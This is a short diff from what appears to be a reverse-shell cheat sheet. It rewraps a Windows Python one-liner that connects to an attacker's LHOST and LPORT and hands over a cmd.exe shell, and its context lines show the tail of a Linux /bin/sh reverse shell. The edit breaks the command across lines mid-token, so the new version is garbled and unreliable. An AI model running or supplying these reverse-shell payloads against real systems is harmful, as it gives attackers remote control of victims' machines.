@@ -36,7 +36,10 @@ os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 Windows : 
 ```bat
-C:\Python26\python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);"
+C:\Python26\python.exe -c "import 
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS
+\\system32\\cmd.exe','-i']);"
 ```
 ### perl
 ```perl
